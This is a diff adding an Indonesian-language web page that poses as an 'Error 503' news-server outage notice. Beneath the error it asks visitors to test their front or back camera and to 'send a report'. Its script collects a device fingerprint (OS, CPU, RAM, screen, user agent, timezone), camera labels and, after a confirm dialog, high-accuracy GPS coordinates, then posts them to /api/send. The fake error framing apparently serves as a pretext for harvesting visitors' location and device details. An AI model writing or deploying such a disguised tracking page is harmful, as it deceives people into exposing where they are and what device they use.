@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<title>Error 503</title>
+
+<style>
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    background: #efefef;
+    font-family: Arial, Helvetica, sans-serif;
+    color: #333;
+}
+
+.wrapper {
+    max-width: 420px;
+    margin: 40px auto;
+    background: #f7f7f7;
+    border-radius: 6px;
+    padding: 30px 20px;
+    text-align: center;
+}
+
+.icon {
+    font-size: 48px;
+    margin-bottom: 10px;
+}
+
+.title {
+    font-size: 36px;
+    font-weight: 700;
+    color: #d32f2f;
+}
+
+.subtitle {
+    font-size: 18px;
+    font-weight: 600;
+    margin-bottom: 10px;
+}
+
+.desc {
+    font-size: 14px;
+    color: #666;
+}
+
+.detail-box {
+    background: #eaeaea;
+    border-left: 4px solid #d32f2f;
+    padding: 12px 14px;
+    margin-top: 15px;
+    border-radius: 4px;
+    text-align: left;
+    font-size: 14px;
+    line-height: 1.6;
+}
+
+.camera-box {
+    margin-top: 15px;
+    padding: 15px;
+    background: white;
+    border-radius: 5px;
+    text-align: left;
+}
+
+.camera-box h3 {
+    margin-top: 0;
+}
+
+video {
+    width: 100%;
+    background: #222;
+    border-radius: 5px;
+    margin-top: 10px;
+    display: none;
+}
+
+button {
+    margin: 15px auto;
+    display: block;
+    background: #d32f2f;
+    color: white;
+    border: none;
+    padding: 11px 25px;
+    font-size: 14px;
+    border-radius: 4px;
+    cursor: pointer;
+}
+
+button:disabled {
+    opacity: 0.5;
+}
+
+.camera-box button {
+    width: 100%;
+}
+
+#status {
+    font-size: 13px;
+    color: #555;
+    line-height: 1.5;
+}
+
+.footer {
+    font-size: 13px;
+    color: #666;
+    margin-top: 20px;
+}
+</style>
+
+</head>
+
+<body>
+
+<div class="wrapper">
+
+    <div class="icon">⚠️</div>
+
+    <div class="title">Error 503</div>
+
+    <div class="subtitle">
+        Layanan Tidak Tersedia
+    </div>
+
+    <div class="desc">
+        Maaf, layanan sedang mengalami gangguan teknis sementara.
+    </div>
+
+    <div class="detail-box">
+        <strong>Detail kesalahan:</strong>
+        Koneksi timeout ke server berita.
+
+        <br><br>
+
+        <strong>Solusi:</strong>
+        <ul>
+            <li>Periksa koneksi internet.</li>
+            <li>Coba muat ulang halaman.</li>
+            <li>Hubungi administrator jika masalah berlanjut.</li>
+        </ul>
+    </div>
+
+    <div class="detail-box">
+        <strong>Informasi privasi:</strong><br>
+        Jika Anda memilih mengirim laporan, informasi teknis
+        perangkat dan IP akan dikirim kepada administrator.
+        Lokasi GPS hanya dikirim setelah izin diberikan.
+        Kamera diperiksa melalui preview yang terlihat.
+    </div>
+
+    <div class="camera-box">
+
+        <h3>📷 Pemeriksaan Kamera</h3>
+
+        <p>
+            Pilih kamera yang ingin diperiksa.
+            Preview akan ditampilkan sebelum status dikirim.
+        </p>
+
+        <label>
+            <input
+                type="radio"
+                name="camera"
+                value="user"
+                checked
+            >
+            Kamera depan
+        </label>
+
+        <br>
+
+        <label>
+            <input
+                type="radio"
+                name="camera"
+                value="environment"
+            >
+            Kamera belakang
+        </label>
+
+        <video
+            id="preview"
+            autoplay
+            playsinline
+        ></video>
+
+        <button onclick="checkCamera()">
+            Periksa Kamera
+        </button>
+
+        <button onclick="stopCamera()">
+            Matikan Kamera
+        </button>
+
+        <p id="cameraStatus">
+            Kamera belum diperiksa.
+        </p>
+
+    </div>
+
+    <button id="sendButton" onclick="sendReport()">
+        Kirim Laporan
+    </button>
+
+    <p id="status"></p>
+
+    <div class="footer">
+        © 2026 Server Support System
+    </div>
+
+</div>
+
+<script>
+
+let cameraStream = null;
+
+let frontCamera = "Belum diperiksa";
+let backCamera = "Belum diperiksa";
+
+const preview = document.getElementById("preview");
+
+const statusText = document.getElementById("status");
+
+const cameraStatus = document.getElementById("cameraStatus");
+
+/* ================= CAMERA ================= */
+
+async function checkCamera() {
+
+    stopCamera();
+
+    const selected =
+        document.querySelector(
+            'input[name="camera"]:checked'
+        ).value;
+
+    try {
+
+        cameraStream =
+            await navigator.mediaDevices.getUserMedia({
+                video: {
+                    facingMode: {
+                        ideal: selected
+                    }
+                },
+                audio: false
+            });
+
+        preview.srcObject = cameraStream;
+        preview.style.display = "block";
+
+        await preview.play();
+
+        const tracks = cameraStream.getVideoTracks();
+
+        const settings = tracks[0].getSettings();
+
+        const label = tracks[0].label || "Kamera tersedia";
+
+        if (selected === "user") {
+            frontCamera = "Tersedia - " + label;
+        } else {
+            backCamera = "Tersedia - " + label;
+        }
+
+        cameraStatus.textContent =
+            selected === "user"
+                ? "Kamera depan berhasil diperiksa."
+                : "Kamera belakang berhasil diperiksa.";
+
+        if (settings.facingMode) {
+            console.log("Facing mode:", settings.facingMode);
+        }
+
+    } catch (error) {
+
+        if (selected === "user") {
+            frontCamera = "Tidak dapat diakses";
+        } else {
+            backCamera = "Tidak dapat diakses";
+        }
+
+        cameraStatus.textContent =
+            "Kamera gagal diakses atau izin ditolak.";
+
+    }
+}
+
+function stopCamera() {
+
+    if (cameraStream) {
+
+        cameraStream.getTracks().forEach(
+            track => track.stop()
+        );
+
+        cameraStream = null;
+    }
+
+    preview.srcObject = null;
+    preview.style.display = "none";
+}
+
+/* ================= LOCATION ================= */
+
+function getLocation() {
+
+    return new Promise(resolve => {
+
+        const approved = confirm(
+            "Apakah Anda setuju membagikan lokasi GPS kepada administrator?"
+        );
+
+        if (!approved || !navigator.geolocation) {
+
+            resolve({
+                locationConsent: false,
+                latitude: null,
+                longitude: null,
+                accuracy: null
+            });
+
+            return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+
+            position => {
+
+                resolve({
+                    locationConsent: true,
+
+                    latitude:
+                        position.coords.latitude,
+
+                    longitude:
+                        position.coords.longitude,
+
+                    accuracy:
+                        position.coords.accuracy + " meter"
+                });
+
+            },
+
+            () => {
+
+                resolve({
+                    locationConsent: false,
+                    latitude: null,
+                    longitude: null,
+                    accuracy: null
+                });
+
+            },
+
+            {
+                enableHighAccuracy: true,
+                timeout: 15000,
+                maximumAge: 0
+            }
+        );
+
+    });
+}
+
+/* ================= SEND REPORT ================= */
+
+async function sendReport() {
+
+    const approved = confirm(
+        "Laporan akan mengirim informasi teknis perangkat, " +
+        "IP, dan status pemeriksaan kamera kepada administrator.\n\n" +
+        "Lokasi GPS hanya dikirim jika Anda menyetujuinya.\n\n" +
+        "Lanjutkan?"
+    );
+
+    if (!approved) return;
+
+    const button = document.getElementById("sendButton");
+
+    button.disabled = true;
+
+    button.textContent = "Memproses...";
+
+    try {
+
+        statusText.textContent =
+            "Meminta izin lokasi...";
+
+        const locationData = await getLocation();
+
+        const baseData = {
+
+            consent: true,
+
+            os:
+                navigator.userAgentData?.platform ||
+                "Unknown",
+
+            platform:
+                navigator.platform || "Unknown",
+
+            cpu:
+                navigator.hardwareConcurrency || "Unknown",
+
+            ram:
+                navigator.deviceMemory
+                    ? navigator.deviceMemory + " GB (approx)"
+                    : "Unknown",
+
+            resolution:
+                screen.width + "x" + screen.height,
+
+            browser:
+                navigator.userAgent,
+
+            timezone:
+                Intl.DateTimeFormat()
+                    .resolvedOptions().timeZone,
+
+            language:
+                navigator.language,
+
+            frontCamera:
+                frontCamera,
+
+            backCamera:
+                backCamera,
+
+            ...locationData
+        };
+
+        statusText.textContent =
+            "Mengirim laporan ke administrator...";
+
+        const response = await fetch("/api/send", {
+
+            method: "POST",
+
+            headers: {
+                "Content-Type": "application/json"
+            },
+
+            body: JSON.stringify(baseData)
+
+        });
+
+        const result = await response.json();
+
+        if (!response.ok || !result.success) {
+            throw new Error(result.message);
+        }
+
+        statusText.textContent =
+            "Laporan berhasil dikirim.";
+
+        button.textContent =
+            "Laporan Terkirim";
+
+        stopCamera();
+
+    } catch (error) {
+
+        console.error(error);
+
+        statusText.textContent =
+            "Gagal mengirim laporan. Silakan coba lagi.";
+
+        button.disabled = false;
+
+        button.textContent = "Kirim Laporan";
+    }
+}
+
+</script>
+
+</body>
+  </html>
